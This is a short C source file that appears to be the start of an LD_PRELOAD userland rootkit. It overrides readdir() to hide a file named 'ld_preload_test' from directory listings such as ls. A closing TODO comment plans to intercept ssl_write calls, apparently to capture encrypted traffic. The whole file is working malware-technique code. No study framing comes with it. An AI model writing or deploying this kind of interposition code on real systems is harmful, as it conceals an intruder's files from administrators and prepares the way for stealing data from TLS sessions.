#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

// hide folder function
typedef struct dirent* (*ls_t)(DIR*);
  
// interposed ls function
struct dirent* readdir(DIR* dirp){
  // Get original readdir address
  ls_t original_readdir = (ls_t)dlsym(RTLD_NEXT, "readdir");
  struct dirent* entry;
  do {
    //Call the original ls function to get the next directory entry
    entry = original_readdir(dirp);
    //Check if the entry is the file we want to hide
    if (entry != NULL && strcmp(entry->d_name, "ld_preload_test") == 0){
    //Skip entry if file name matches, thus hiding from ls
      entry = original_readdir(dirp);
    }
  } while (entry != NULL && strcmp(entry->d_name, "ld_preload_test") == 0);
  return entry;
} 
// TODO: intercept ssl_write calls 


